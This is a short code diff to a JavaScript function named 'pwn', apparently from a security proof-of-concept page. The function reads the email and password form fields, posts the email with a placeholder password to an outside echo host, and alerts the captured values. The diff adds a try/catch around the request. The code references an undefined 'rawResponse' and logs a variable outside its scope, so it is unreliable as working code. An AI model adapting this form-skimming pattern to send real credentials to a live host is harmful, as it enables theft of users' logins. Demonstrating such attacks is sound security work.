@@ -16,15 +16,19 @@
           async function pwn(){
             email = document.getElementById("email").value
             password = document.getElementById("password").value
-            await fetch('https://httpbin.org/post', {
-              method: 'POST',
-              headers: {
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify({email: email, pass: 'could-have-been-password'})
-            });
-            const content = await rawResponse.json();
+            try {
+              await fetch('https://httpbin.org/post', {
+                method: 'POST',
+                headers: {
+                  'Accept': 'application/json',
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({email: email, pass: 'could-have-been-password'})
+              });
+              const content = await rawResponse.json();
+            }catch(e){
+              console.log(e)
+            }
             console.log(content);
             alert("You've been PWNed: " + email + " : " + password);
           }
